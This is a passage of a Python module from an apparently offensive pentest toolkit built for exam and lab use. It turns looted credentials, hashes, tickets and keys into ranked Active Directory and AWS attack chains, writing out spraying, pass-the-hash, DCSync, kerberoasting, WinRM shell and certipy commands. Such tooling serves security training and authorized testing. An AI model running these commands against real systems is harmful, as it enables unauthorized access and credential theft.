"""correlate.py - the loot CORRELATION / ATTACK-CHAINING engine.

Runs AFTER all analyzers + ingest. It joins what secrethound found (creds,
hashes, keys, GPP, kerberos artifacts) with the ingested evidence (nmap
services, BloodHound facts, validated creds, host inventory) and emits ranked,
EXAM-LEGAL next actions under category ATTACK CHAINS.

Compliance is enforced from ONE source of truth: every emitted command is linted
against analyzers.compliance (no second allowlist lives here). Spoofing/relay
steps are confined to lab_only chains, capped at MEDIUM, never a top action, and
always carry the [LAB-ONLY] tag.
"""
import re
from analyzers import compliance, filters
from analyzers.ingest.evidence import Evidence

LAB = compliance.LAB_ONLY_TAG

# ── detail-prefix parsers (the entity extractors) ──
_RX = {
    "credpair": re.compile(r'USER=(\S+)\s+PASS=(\S+)'),
    "cracked": re.compile(r"CRACKED .*?=\s*'([^']+)'"),
    "default_nt": re.compile(r"NTLM \(DEFAULT = '([^']+)'\):\s*([a-f0-9]{32})", re.I),
    "default_generic": re.compile(r"\(DEFAULT = '([^']+)'\)"),
    "nt": re.compile(r'NTLM(?: hash)?(?: \(NT\))?:?\s*([a-f0-9]{32})', re.I),
    "notes_pass": re.compile(r'notes(?:\s*table)?:\s*(?:PASS=|\S+?:)([^\s(]+)'),
    "assigned": re.compile(r'^[^=:]{1,40}[:=]\s*["\']?([^"\'\s#;]{4,60})'),
}


class Chain:
    __slots__ = ("rule", "label", "summary", "crit", "conf", "ready", "prox",
                 "commands", "lab_only", "src", "line", "count")

    def __init__(self, rule, label, summary, crit, conf, ready, prox,
                 commands, lab_only=False, src="?", line=None, count=1):
        self.rule, self.label, self.summary = rule, label, summary
        self.crit, self.conf, self.ready, self.prox = crit, conf, ready, prox
        self.commands, self.lab_only = commands, lab_only
        self.src, self.line = src, line
        self.count = count          # how many findings this one chain represents

    @property
    def score(self):
        return round(self.crit * self.conf * self.prox * self.ready, 1)


class _Ents:
    def __init__(self):
        # iter-14: value is now LIST of (user_display, source, line) so a
        # second occurrence of the same (user, pw) accumulates evidence
        # instead of silently dropping the earlier source/line.
        self.creds = {}        # (user_lc, pw) -> [(user_display, source, line), ...]
        self.users = set()
        self.nt = {}           # hash -> [(user, source, line), ...]  iter-14: list
        self.defaults = {}     # label -> [(source, line), ...]       iter-14: dict-of-list
        self.kerberoastable = set()
        self.asreproastable = set()
        self.has_tgs = self.has_asrep = self.has_shadow = False
        self.has_gpp = self.has_pkey = self.has_cert = self.has_ccache = False
        self.shadow_src = self.gpp_src = self.pkey_src = self.cert_src = None
        self.ccache_src = self.tgs_src = self.asrep_src = None
        self.sam_dirs = {}     # dir -> set(hive names)
        # iter-23: ACL edges from BloodHound + ADCS cert templates from
        # certipy/BloodHound CE. These drive R-SHADOW / R-WRITEDACL /
        # R-ADCS chains. acl_edges is list of dicts so we can route by
        # both right-name and target object.
        self.acl_edges = []
        self.cert_templates = []


def _add_cred(e, user, pw, src, line):
    pw = (pw or "").strip().strip("'\"")
    if not pw or len(pw) < 3:
        return
    # iter-14: append (don't overwrite) so multiple sources for the same
    # cred accumulate evidence. The R1 spray chain only needs ONE
    # (src,line) anchor, but losing the others poisons attribution.
    key = ((user or "").lower(), pw)
    e.creds.setdefault(key, []).append((user or "<user>", src, line))
    if user:
        e.users.add(user)


def _add_default(e, label, src, line=None):
    """iter-14: track default cred as dict-of-list so 'admin/admin' seen
    in multiple files dedups to one chain but retains all evidence."""
    if not label:
        return
    e.defaults.setdefault(label, []).append((src, line))


def _add_nt(e, hash_val, user, src, line):
    """iter-14: append (don't overwrite) so a hash seen via SAM + secretsdump
    + LSA accumulates all evidence; the R7 chain count reflects the truth."""
    if not hash_val:
        return
    e.nt.setdefault(hash_val.lower(), []).append((user, src, line))


def _entities(report, store):
    e = _Ents()
    import os
    for f in report.findings:
        d, cat, src, ln = f["detail"], f["category"], f["file"], f["line"]
        if cat == "CRED PAIRS":
            m = _RX["credpair"].search(d)
            if m:
                _add_cred(e, m.group(1), m.group(2), src, ln)
            m = _RX["cracked"].search(d)
            if m:
                _add_cred(e, "", m.group(1), src, ln)
            mn = _RX["notes_pass"].search(d)
            if mn:
                _add_cred(e, "", mn.group(1), src, ln)
            md = _RX["default_nt"].search(d)
            if md:
                _add_default(e, md.group(1), src, ln); _add_cred(e, "", md.group(1), src, ln)
        if cat == "PASSWORD HASHES":
            mdn = _RX["default_nt"].search(d)
            if mdn:
                _add_default(e, mdn.group(1), src, ln); _add_cred(e, "", mdn.group(1), src, ln)
            elif "NTLM" in d and "blank" not in d.lower():
                # user-bound form "NTLM (NT) <user>: <hash>" (from pwdump rows)
                mb = re.search(r'NTLM \(NT\)\s*([^\s:]+)\s*:\s*([a-f0-9]{32})', d)
                if mb and not filters.is_blank_hash(mb.group(2)):
                    _add_nt(e, mb.group(2), mb.group(1), src, ln)
                elif not mb:
                    mh = re.search(r'\b([a-f0-9]{32})\b', d)
                    if mh and not filters.is_blank_hash(mh.group(1)):
                        _add_nt(e, mh.group(1), None, src, ln)
            if d.startswith(("sha512crypt", "md5crypt", "sha256crypt", "bcrypt", "yescrypt")):
                e.has_shadow = True; e.shadow_src = e.shadow_src or (src, ln)
            if d.startswith("Kerberoast TGS"):
                e.has_tgs = True; e.tgs_src = e.tgs_src or (src, ln)
            if d.startswith("AS-REP roast"):
                e.has_asrep = True; e.asrep_src = e.asrep_src or (src, ln)
        if "DEFAULT = '" in d and cat != "PASSWORD HASHES":
            mdg = _RX["default_generic"].search(d)
            if mdg:
                _add_default(e, mdg.group(1), src, ln); _add_cred(e, "", mdg.group(1), src, ln)
        if cat == "GPP cpassword":
            e.has_gpp = True; e.gpp_src = e.gpp_src or (src, ln)
        if cat == "PRIVATE KEYS":
            e.has_pkey = True; e.pkey_src = e.pkey_src or (src, ln)
        if cat == "INTERESTING FILES":
            low = (src or "").lower()
            if low.endswith((".pfx", ".p12")):
                e.has_cert = True; e.cert_src = e.cert_src or (src, ln)
            if low.endswith((".kirbi", ".ccache")) or "krb5cc" in low:
                e.has_ccache = True; e.ccache_src = e.ccache_src or (src, ln)
            base = os.path.basename(low)
            if base in ("sam", "system", "security"):
                e.sam_dirs.setdefault(os.path.dirname(src), set()).add(base)
            # iter-21: NTDS.dit + SYSTEM offline DCSync chain (R3D).
            # When the operator has BOTH the NTDS database AND the SYSTEM
            # hive from the same DC backup, secretsdump can DCSync ALL
            # domain creds offline with zero network noise.
            if base in ("ntds.dit", "ntds", "ntds.dit.bak"):
                e.sam_dirs.setdefault(os.path.dirname(src), set()).add("ntds")
            if base == "system" and os.path.dirname(src):
                # system hive shared between SAM (local) and NTDS (domain)
                # paths - already added above
                pass
    # merge ingested evidence
    for ev in store.items:
        if ev.kind == "plaintext" and ev.plaintext:
            _add_cred(e, ev.user, ev.plaintext, ev.source, ev.line)
        elif ev.kind == "cred" and ev.cred:
            _add_cred(e, ev.user, ev.cred, ev.source, ev.line)
        elif ev.kind == "hash" and ev.hash and not filters.is_blank_hash(ev.hash):
            _add_nt(e, ev.hash, ev.user, ev.source, ev.line)
        if ev.user:
            e.users.add(ev.user)
        if ev.fact == "kerberoastable":
            e.kerberoastable.add(ev.user)
        elif ev.fact == "asreproastable":
            e.asreproastable.add(ev.user)
        # iter-23: ACL edges (BloodHound Aces[]) and cert templates
        # (certipy find / BloodHound CE certtemplates).
        # iter-35: init krbtgt flag if not set (first evidence pass)
        if not hasattr(e, "has_krbtgt"):
            e.has_krbtgt = False
            e.krbtgt_hash = ""
            e.krbtgt_dom = ""
            e.krbtgt_src = None
        if ev.kind == "acl_edge" and ev.fact:
            m = ev.meta or {}
            # iter-103: ev.host got canon'd (lowercased) by Store.add(); the
            # original case-preserved target lives in meta['target']. Prefer
            # the meta version so summaries + commands read 'HELPDESK' not
            # 'helpdesk' when BloodHound had it uppercase.
            _tgt_pref = m.get("target") or ev.host
            e.acl_edges.append({
                "right": ev.fact,
                "target": _tgt_pref,
                "principal": ev.user,
                "ptype": m.get("principal_type", ""),
                "target_kind": m.get("target_kind", ""),
                "src": ev.source, "line": ev.line,
            })
        # iter-35: krbtgt NT hash -> golden ticket forgery. Highest-priority
        # chain when present because it gives Administrator against ANY
        # user in the domain, offline, no network.
        if ev.kind == "krbtgt" and ev.hash:
            e.has_krbtgt = True
            e.krbtgt_hash = ev.hash
            e.krbtgt_dom = ev.domain or ""
            e.krbtgt_src = (ev.source, ev.line)
        if ev.kind == "cert_template":
            m = ev.meta or {}
            e.cert_templates.append({
                "template": m.get("template", ""),
                "ca": m.get("ca", ""),
                "esc": m.get("esc") or [],
                "lab_only": bool(m.get("lab_only")),
                "src": ev.source, "line": ev.line,
            })
    return e


def _userlist(e):
    return "users.txt" if len({u.lower() for u in e.users}) > 1 else None


def _machine(src, root):
    """top-level loot dir (per-box scope), e.g. 'forest' from htb/forest/notes."""
    import os
    if not src or src.startswith(("<", "bloodhound")):
        return ""
    try:
        rel = os.path.relpath(src, root)
    except ValueError:
        rel = src
    parts = rel.split(os.sep)
    return parts[0] if parts and parts[0] not in (".", "..") else ""


def run(report, store, ui=None):
    import os
    e = _entities(report, store)
    root = getattr(report, "root", ".")

    # per-machine service / DC maps (so a cred on box A never chains to box B)
    mach_svc, mach_dc = {}, {}
    for ev in store.by_kind("service"):
        if ev.host and ev.service:
            mach_svc.setdefault(_machine(ev.source, root), {}).setdefault(ev.service, ev.host)
    global_dc = ""
    for x in store.by_kind("host"):
        if x.fact == "dc" and x.host:
            mach_dc.setdefault(_machine(x.source, root), x.host)
            global_dc = global_dc or x.host

    def svc_on(mach, svc):
        return mach_svc.get(mach, {}).get(svc)

    def dc_for(mach):
        return mach_dc.get(mach) or svc_on(mach, "smb") or global_dc or "<DC-IP>"

    chains = []
    ul = _userlist(e)

    # ── plaintext creds: spray + (only same-machine) service shells ──
    # iter-14: e.creds is now dict-of-list. iter-15: pick the BEST occurrence
    # (real user display + deterministic src path) so attribution stays stable
    # across runs and points at the most informative source.
    # iter-34: dedup by pw. When N>=2 distinct KNOWN users share a pw, emit
    # ONE aggregate R1 chain telling the operator to spray with users.txt
    # instead of N separate 'reuse USER:pw' chains. Keeps per-user chains
    # when only one user has the pw (still valuable attribution).
    from collections import defaultdict
    by_pw = defaultdict(list)
    for (ulc, pw), occs in e.creds.items():
        by_pw[pw].append((ulc, occs))
    for pw, users_occs in by_pw.items():
        known_users = {u for u, _ in users_occs if u}
        aggregate = len(known_users) >= 2
        if aggregate:
            # pick the earliest / most-informative anchor across all users
            all_occs = [(u, o) for u, occs in users_occs for o in occs]
            all_occs.sort(key=lambda t: (t[1][0] == "<user>", t[1][1] or "",
                                          t[1][2] or 0))
            disp0, src, ln = all_occs[0][1]
            mach = _machine(src, root)
            smb = svc_on(mach, "smb") or dc_for(mach)
            utoken = "users.txt"
            summary = (f"pw '{pw}' shared across {len(known_users)} users "
                       f"({', '.join(sorted(known_users)[:4])}"
                       f"{', ...' if len(known_users) > 4 else ''})")
            lockout = getattr(store, "lockout_threshold", None)
            lockout_note = ""
            if lockout and lockout > 0:
                lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
                                f"do NOT spray more attempts than {lockout - 1} per user")
            chains.append(Chain("R1", "spray", summary,
                crit=8, conf=0.85, ready=1.5, prox=_prox(store, smb),
                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' "
                          f"--continue-on-success{lockout_note}"],
                src=src, line=ln, count=len(known_users)))
            continue
        # Non-aggregate: per-user R1 + R3/R4/R5 emissions (existing behavior).
        for ulc, occurrences in users_occs:
            def _cred_quality(o):
                d, s, l = o
                return (d == "<user>", s or "", l or 0)
            best = sorted(occurrences, key=_cred_quality)[0]
            disp, src, ln = best
            mach = _machine(src, root)
            smb = svc_on(mach, "smb") or dc_for(mach)
            utoken = ul or f"'{disp}'"
            # iter-16: spray safety gating
            #   - lockout-threshold guardrail when known
            #   - -k flag only when user-cred carries kerberos context (FQDN
            #     username or netexec_db kerberos hit); blind addition causes
            #     "kerberos config missing" errors when $KRB5CCNAME is unset.
            lockout = getattr(store, "lockout_threshold", None)
            lockout_note = ""
            if lockout and lockout > 0:
                lockout_note = (f"   # CAUTION: domain lockout threshold={lockout}; "
                                f"do NOT spray more attempts than {lockout - 1} per user")
            has_krb_ctx = "." in (disp or "") or "@" in (disp or "")
            krb_flag = " -k" if (has_krb_ctx and utoken != "users.txt") else ""
            # iter-77: same gate as R7 (iter-76) - -just-dc only works when
            # smb IS the DC. For non-DC targets, drop -just-dc and note that
            # the DCSync form needs a DC target.
            _r1_prox = _prox(store, smb)
            _r1_tgt_dc = _r1_prox >= 1.0
            # iter-110: whole-URI single-quoting for parity with R7 / R-*
            # chains. 'user:pw@target' as one unit; special chars in pw stay
            # literal.
            _r1_uri = f"'{disp}:{pw}@{smb}'"
            if _r1_tgt_dc:
                _r1_dump = f"impacket-secretsdump {_r1_uri} -just-dc"
                _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, then dcsync "
                                 f"(gates the secretsdump):")
            else:
                _r1_dump = f"impacket-secretsdump {_r1_uri}"
                _r1_dump_note = (f"# AFTER confirming Pwn3d! on {smb}, dump local "
                                 f"SAM + LSA cached secrets (target isn't the DC):")
            chains.append(Chain("R1", "spray", f"reuse {disp}:{pw} across hosts",
                crit=8, conf=0.8, ready=1.5, prox=_r1_prox,
                commands=[f"netexec smb {smb} -u {utoken} -p '{pw}' --continue-on-success{krb_flag}{lockout_note}",
                          _r1_dump_note,
                          _r1_dump],
                src=src, line=ln))
            wh = svc_on(mach, "winrm")
            if wh:
                chains.append(Chain("R3", "winrm shell", f"{disp} -> WinRM {wh}",
                    crit=7, conf=0.8, ready=1.5, prox=_prox(store, wh),
                    commands=[f"evil-winrm -i {wh} -u '{disp}' -p '{pw}'"], src=src, line=ln))
            mh = svc_on(mach, "mssql")
            if mh:
                # iter-111: whole-URI quoting parity with iter-110 (R1) and
                # iter-109 (R7) - one 'user:pw@target' single-quoted unit.
                chains.append(Chain("R4", "mssql", f"{disp} -> MSSQL {mh}",
                    crit=6, conf=0.7, ready=1.5, prox=_prox(store, mh),
                    commands=[f"impacket-mssqlclient '{disp}:{pw}@{mh}' -windows-auth"], src=src, line=ln))
            sh = svc_on(mach, "ssh")
            if sh:
                # iter-13: SSH password login is more reliable than MSSQL
                # -windows-auth (which depends on a successful AD mapping).
                chains.append(Chain("R5", "ssh", f"{disp} -> SSH {sh}",
                    crit=6, conf=0.75, ready=1.5, prox=_prox(store, sh),
                    commands=[f"ssh '{disp}'@{sh}    # password: {pw}"], src=src, line=ln))

    # ── NT hashes: AGGREGATE per target (one rolled-up PtH chain, not 1/hash) ──
    # iter-13 false-confidence fix: tag hash origin (local-SAM vs domain) so
    # R7's command can include --local-auth when the hash came from a SAM hive
    # and we're targeting the originating host (not the DC).
    def _hash_is_local_sam(src_path):
        """Heuristic: hash extracted from SAM/SYSTEM (LOCAL secretsdump) is
        a LOCAL account NT - PtH against the same host needs --local-auth.
        Domain hashes (from ntds.dit / DCSync) work against the DC without it."""
        plow = (src_path or "").lower()
        return any(k in plow for k in
                   ("/sam", "/system", "sam+system", "sam_system",
                    "lsadump::sam", "local secretsdump"))

    by_target = {}
    # iter-15: pick the BEST occurrence as the anchor (not just the first).
    # Quality rank: (a) prefer an occurrence with a real username; (b) prefer
    # the one whose machine resolves to a DC target; (c) tiebreak by sorting
    # source path for determinism across runs / filesystems.
    def _hash_quality(occ):
        user, src, line = occ
        mach = _machine(src, root)
        has_user = bool(user)
        tgt_svc = svc_on(mach, "smb")
        is_dc = bool(tgt_svc) and (_prox(store, tgt_svc) >= 1.0)
        # lower is better (used as sort key)
        return (not has_user, not is_dc, src or "", line or 0)

    for h, occurrences in e.nt.items():
        # pick best occurrence for src/line anchor
        best = sorted(occurrences, key=_hash_quality)[0]
        huser, src, ln = best
        mach = _machine(src, root)
        tgt = svc_on(mach, "smb") or dc_for(mach)
        by_target.setdefault(tgt, []).append((h, huser, src, ln))
    for tgt, items in by_target.items():
        # iter-15: also rank items inside a target group so the printed h0/u0
        # picks the quality occurrence, not the dict-iteration first.
        items.sort(key=lambda x: (not x[1], x[2] or "", x[3] or 0))
        h0, u0, src0, ln0 = items[0]
        u = u0 or "<user>"
        n = len(items)
        more = f"   # +{n - 1} more NT hashes here - loop the rest (see PASSWORD HASHES)" if n > 1 else ""
        # iter-13: R7 prox = best reachable target so a DC anywhere in the
        # group lifts the parent action above its R8 winrm child.
        best_prox = _prox(store, tgt)
        for _h, _u, _s, _l in items:
            for svc in ("smb", "winrm"):
                h_ = svc_on(_machine(_s, root), svc)
                if h_:
                    best_prox = max(best_prox, _prox(store, h_))
        # iter-13: if the hash came from a SAM hive, the cred is LOCAL.
        # PtH against the DC is the wrong move; PtH against the originating
        # host with --local-auth is the right one. Emit two distinct chains.
        local_origin = any(_hash_is_local_sam(s) for _h, _u, s, _l in items)
        if local_origin:
            cmd_pth = (f"netexec smb {tgt} -u '{u}' -H {h0} --local-auth{more}    "
                       f"# LOCAL SAM hash - target the ORIGINATING host, not the DC")
        else:
            cmd_pth = f"netexec smb {tgt} -u '{u}' -H {h0}{more}"
        # iter-24: drop literal '<DOMAIN>' when we've learned a real domain
        # from BloodHound / NTDS / netexec_db; otherwise keep the placeholder.
        _dom_r7 = store.dominant_domain() or "<dom>"
        # iter-76: -just-dc only works when tgt IS the DC (impacket triggers
        # DCSync via DRSUAPI, which requires target = DC replication endpoint).
        # If tgt is a non-DC domain host, the second command was previously
        # wasted breath - swap to a useful post-Pwn3d hint (dump SAM+SYSTEM
        # for local hashes; LSASecret / cached creds for domain fallback).
        _tgt_is_dc = best_prox >= 1.0
        # iter-109: whole-URI single-quoting for parity with the rest of the
        # impacket chain block (R-GOLDEN, R-CONSTRAINED, R-DCSYNC, R-ADMIN-CRED
        # all quote 'dom/user@target' as one unit). Also switch the -hashes
        # syntax from ':NT' to the explicit blank-LM 'aad3b4...:NT' used
        # everywhere else so the emitted commands read uniformly.
        _r7_hf = f"-hashes 'aad3b435b51404eeaad3b435b51404ee:{h0}'"
        if local_origin:
            _r7_follow = ("# DCSync NOT available with LOCAL SAM hashes; "
                          "gather domain creds first")
        elif _tgt_is_dc:
            _r7_follow = (f"impacket-secretsdump {_r7_hf} "
                          f"'{_dom_r7}/{u}@{tgt}' -just-dc   # if (Pwn3d!)")
        else:
            _r7_follow = (f"impacket-secretsdump {_r7_hf} "
                          f"'{_dom_r7}/{u}@{tgt}'   "
                          f"# if (Pwn3d!) - dumps LOCAL SAM + LSA cached "
                          f"secrets; DCSync requires DC target")
        chains.append(Chain("R7", "pass-the-hash", f"PtH -> {tgt}" + (f"  x{n} hashes" if n > 1 else f" ({u})"),
            crit=10, conf=0.85, ready=1.5, prox=best_prox,
            commands=[cmd_pth, _r7_follow],
            src=src0, line=ln0, count=n))
        # winrm PtH only when that machine actually exposes winrm
        wh = None
        for _h, _u, _s, _l in items:
            wh = svc_on(_machine(_s, root), "winrm")
            if wh:
                break
        if wh:
            # iter-16: was f-string-then-concat; the {wh} in the NOTE half
            # was a literal '{wh}' instead of the interpolated value.
            note = (f"    # NOTE: local-SAM hash; ensure {wh} == originating host"
                    if local_origin else "")
            cmd_wh = f"evil-winrm -i {wh} -u '{u}' -H {h0}{note}"
            chains.append(Chain("R8", "PtH winrm", f"PtH -> WinRM {wh}",
                crit=8, conf=0.8, ready=1.5, prox=_prox(store, wh),
                commands=[cmd_wh], src=src0, line=ln0, count=n))

    def host(svc, fallback="<target>"):     # legacy helper used by rules below
        for m in mach_svc:
            if svc in mach_svc[m]:
                return mach_svc[m][svc]
        return fallback

    def dc(fallback="<DC-IP>"):
        # iter-82: prefer Store.dc_ip() (which enforces IP-shape via _IP regex
        # and IPv6 canonicalisation) over the raw global_dc from by_kind('host'),
        # so callers threading dc() into '-dc-ip <val>' get an IP address rather
        # than an FQDN that -dc-ip can't consume without DNS SRV present.
        return store.dc_ip() or global_dc or fallback

    # iter-12 composite: AWS access key + secret in the same file within
    # 30 lines = an AWS auth-complete pair. Emit one CRITICAL chain with the
    # ready-to-paste `aws sts get-caller-identity` invocation; the per-rule
    # 'AWS access key' / 'AWS secret' findings remain in their categories.
    aws_akids, aws_saks = {}, {}
    for f in report.findings:
        det = f.get("detail") or ""
        path = f.get("file") or ""
        line = f.get("line") or 0
        if "AWS access key" in det:
            # detail format: "AWS access key: AKIA..."
            akid = det.split(":", 1)[-1].strip()
            aws_akids.setdefault(path, []).append((akid, line))
        elif "AWS secret" in det:
            sak = det.split(":", 1)[-1].strip()
            aws_saks.setdefault(path, []).append((sak, line))
    # iter-14: dedup R30 by akid across files - same access key in two files
    # should emit ONE chain, not two.
    seen_aws = set()
    for path, akids in aws_akids.items():
        for akid, akline in akids:
            if akid in seen_aws:
                continue
            for sak, sline in aws_saks.get(path, []):
                if abs((sline or 0) - (akline or 0)) > 30:
                    continue
                seen_aws.add(akid)
                # iter-13: AWS keys often rotated / disabled; PtH on a real NT
                # hash is more reliable. Drop prox 0.8 -> 0.7 (~8.51) so PtH on
                # non-DC SMB (8.93) wins by default. AWS is also mostly out-of-
                # scope for the OSCP+ AD exam path - keep findable but never
                # poison the top of the queue when AD context is rich.
                # iter-16: AKIA = long-lived (no session token), ASIA = STS
                # temp (REQUIRES session token). The IMDS rule captures the
                # token; if available, paste it from the IMDS finding's
                # 'AWS Session Token' line. Add the export line as a hint.
                is_sts = akid.startswith("ASIA")
                cmds = [
                    f"export AWS_ACCESS_KEY_ID={akid}",
                    f"export AWS_SECRET_ACCESS_KEY={sak}",
                ]
                if is_sts:
                    cmds.append("export AWS_SESSION_TOKEN=<paste from IMDS finding 'Session Token'>"
                                "    # REQUIRED for ASIA keys, optional for AKIA")
                cmds += [
                    "aws sts get-caller-identity",
                    "aws s3 ls; aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)",
                ]
                chains.append(Chain("R30", "AWS auth-complete",
                    f"AWS access+secret pair: {akid} / {sak[:8]}...",
                    crit=9, conf=0.9, ready=1.5, prox=0.7,        # score 8.51
                    commands=cmds, src=path, line=akline))
                break  # one pair per akid

    # default creds -> log in directly. iter-13: demoted from crit=8/conf=1.0
    # because it's a GUESS, not an artifact. iter-14: e.defaults is now a
    # dict-of-list; dedup by label so 'admin/admin' seen in 3 files emits
    # ONE R24 chain (with count=3) instead of three separate ones.
    for label, occurrences in e.defaults.items():
        # iter-15: sort by (src, line) to pick the deterministic anchor and
        # PRESERVE the line (was dropped). Operator can now navigate to it.
        best = sorted(occurrences, key=lambda x: (x[0] or "", x[1] or 0))[0]
        src0, ln0 = best
        chains.append(Chain("R24", "default cred", f"default password '{label}' in use",
            crit=6, conf=0.7, ready=1.3, prox=0.8,        # score 4.37
            commands=[f"netexec smb {dc()} -u '<user>' -p '{label}'"],
            src=src0, line=ln0, count=len(occurrences)))

    # iter-24: pick a concrete <DOMAIN> from the store so the operator
    # pastes a working command, not '<DOMAIN>/<user>:<pass>'.
    dom = store.dominant_domain() or "<dom>"
    # kerberoast. iter-13: prox honors DC presence so a known DC lifts the score
    # iter-24: per-user '-request-user' form when we know the exact
    # kerberoastable SPN owner (BloodHound hasspn). One command per user
    # is the canonical OSCP+ pattern and lets the operator scope-creep
    # only the user that actually has the SPN.
    # iter-58: if we've seen any plaintext cred, use the FIRST one as the
    # authenticating principal instead of the '<owned-user>:<password>'
    # placeholder. Kerberoast needs any authenticated request; the operator
    # can swap to a stronger cred later if needed.
    _kb_owner = "<owned-user>"
    _kb_pw = "<password>"
    _kb_hash = ""
    if e.creds:
        ((_owned_lc, _owned_pw), _occs) = next(iter(e.creds.items()))
        _kb_owner = _occs[0][0] if _occs[0][0] != "<user>" else _owned_lc
        _kb_pw = _owned_pw
    elif e.nt:
        # iter-105: fall back to any NT hash whose user is known - kerberoast
        # only needs any authenticated request, so a machine account hash
        # (very common HTB pattern) triggers R9 too.
        for _h, _occs in e.nt.items():
            for _hu, _hs, _hl in _occs:
                if _hu:
                    _kb_owner = _hu
                    _kb_hash = _h
                    break
            if _kb_hash:
                break
    for u in e.kerberoastable:
        # iter-105: switch to -hashes form when we only have an NT hash.
        # iter-107: single-quote the URI so machine-account names ending in
        # '$' don't get partially-eaten by bash variable expansion. Plaintext
        # form quotes the whole 'dom/user:pw' so ':' + special chars in pw
        # are also safe.
        _kb_uri = (f"'{dom}/{_kb_owner}'" if _kb_hash
                   else f"'{dom}/{_kb_owner}:{_kb_pw}'")
        _kb_hash_flag = (f" -hashes 'aad3b435b51404eeaad3b435b51404ee:{_kb_hash}'"
                         if _kb_hash else "")
        chains.append(Chain("R9", "kerberoast", f"kerberoastable: {u}",
            crit=6, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
            commands=[f"impacket-GetUserSPNs -request-user '{u}' -dc-ip {dc()} "
                      f"{_kb_uri}{_kb_hash_flag}",
                      f"hashcat -m 13100 tgs.txt rockyou.txt -r best64.rule"],
            src="bloodhound"))
    if e.has_tgs:
        s, l = e.tgs_src
        # iter-80: use the real path to the hash file so operator doesn't
        # have to extract the TGS blob into a separate tgs.txt file first.
        _tgs_path = s if s else "tgs.txt"
        chains.append(Chain("R10", "crack TGS", "Kerberoast TGS hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=[f"hashcat -m 13100 '{_tgs_path}' rockyou.txt -r best64.rule"],
            src=s, line=l))
    # AS-REP. iter-13: prox honors DC presence
    # iter-24: per-user form when target user is known (AS-REP doesn't need
    # creds: -no-pass flag). With a single asreproastable user we don't
    # need usersfile - just request that one user directly.
    for u in e.asreproastable:
        chains.append(Chain("R11", "AS-REP roast", f"AS-REP-able: {u}",
            crit=5, conf=0.8, ready=0.7, prox=max(0.7, _prox(store, dc())),
            commands=[f"echo '{u}' > asrep_users.txt; "
                      f"impacket-GetNPUsers {dom}/ -usersfile asrep_users.txt "
                      f"-dc-ip {dc()} -no-pass -request -format hashcat | tee asrep.txt",
                      "hashcat -m 18200 asrep.txt rockyou.txt"], src="bloodhound"))
    if e.has_asrep:
        s, l = e.asrep_src
        # iter-80: same path threading for the AS-REP cracker.
        _asrep_path = s if s else "asrep.txt"
        chains.append(Chain("R12", "crack AS-REP", "AS-REP hash present",
            crit=4, conf=0.8, ready=0.7, prox=0.6,
            commands=[f"hashcat -m 18200 '{_asrep_path}' rockyou.txt"],
            src=s, line=l))

    # GPP cpassword. iter-13: conf=1.0 was over-confident - the DECRYPTION is
    # deterministic (published MS AES key) but the recovered cred validity is
    # not (MS14-025 prompted mass rotations of GPP-pushed local-admin pws).
    if e.has_gpp:
        s, l = e.gpp_src
        # iter-73: extract the actual cpassword blob from the finding hint
        # so the emitted command carries the real base64 value the operator
        # would otherwise have to copy manually. Undecrypted GPP findings
        # are surfaced under cat='GPP cpassword' with a 'gpp-decrypt <blob>'
        # hint; decrypted ones land under CRED PAIRS (no R13 needed).
        _cpw_blob = "<cpassword-value>"
        for _f in report.findings:
            if _f.get("category") == "GPP cpassword" and _f.get("file") == s:
                _hint = _f.get("hint") or ""
                _m = re.search(r"gpp-decrypt\s+'([^']+)'", _hint)
                if _m:
                    _cpw_blob = _m.group(1)
                    break
        chains.append(Chain("R13", "gpp-decrypt", "GPP cpassword (public AES key)",
            crit=7, conf=0.9, ready=1.5, prox=0.85,        # score 8.04
            commands=[f"gpp-decrypt '{_cpw_blob}'",
                      f"netexec smb {dc()} -u '<user>' -p '<decrypted>' --local-auth --continue-on-success"],
            src=s, line=l))
    # private key
    if e.has_pkey:
        s, l = e.pkey_src
        sh = host("ssh")
        # iter-72: substitute the real key file path so the operator gets
        # 'chmod 600 /loot/id_rsa; ssh -i /loot/id_rsa <user>@target'
        # ready to paste. src is guaranteed set when has_pkey fired (see
        # _entities()); fall back to placeholder for defensive safety.
        _kf = s if s else "<keyfile>"
        chains.append(Chain("R17", "ssh key", "private key recovered",
            crit=6, conf=0.7, ready=1.3, prox=_prox(store, sh),
            commands=[f"chmod 600 '{_kf}'; ssh -i '{_kf}' <user>@{sh}",
                      f"if ENCRYPTED: ssh2john '{_kf}' > k; hashcat -m 22921 k rockyou.txt"],
            src=s, line=l))
    # cert / pfx -> certipy -> PtH. iter-13: ADCS PKINIT is a one-command
    # paste (certipy auth -pfx); under-rated vs GPP/PtH despite same effort.
    # iter-16: previous command never passed -password, so Certipy halted
    # at the PFX-unlock prompt. Add the placeholder so the operator knows
    # to populate it from the captured 'PFX cert password' finding (R7
    # secondary or keyword.py PFX rule).
    if e.has_cert:
        s, l = e.cert_src
        # iter-71: use the actual .pfx source path instead of '<file.pfx>' so
        # the operator gets a ready-to-run command. Fall back to placeholder
        # when src looks empty/generic.
        _pfx_path = s if s and s.lower().endswith((".pfx", ".p12")) else "<file.pfx>"
        chains.append(Chain("R16", "AD CS cert", "PKCS#12 cert/key (certipy -> NT hash/TGT)",
            crit=8, conf=0.8, ready=1.4, prox=0.85,        # score 7.62
            commands=[f"certipy auth -pfx '{_pfx_path}' -password '<pfx-password-if-set>' -dc-ip {dc()}",
                      "then PtH the recovered NT hash (see R7)"], src=s, line=l))
    # ccache / kirbi. iter-16: removed literal '-FQDN' suffix on dc() that
    # produced an unresolvable hostname '10.10.10.5-FQDN'. Kerberos requires
    # the DC's actual FQDN (the SPN in the ticket), so we tell the operator
    # to substitute - we cannot resolve IP -> FQDN passively.
    if e.has_ccache:
        s, l = e.ccache_src
        _dom_r26 = store.dominant_domain() or "<dom>"
        _dc_fqdn_r26 = store.dc_fqdn() or "<DC-FQDN>"
        _dc_ip_r26 = store.dc_ip() or "<DC-IP>"
        # iter-71: use the actual ticket file path instead of the placeholder
        # so the operator can paste the export line directly. Accepts .ccache,
        # .kirbi, and krb5cc_* files (all valid impacket ticket formats).
        _ccache_path = s if s and (s.lower().endswith((".ccache", ".kirbi"))
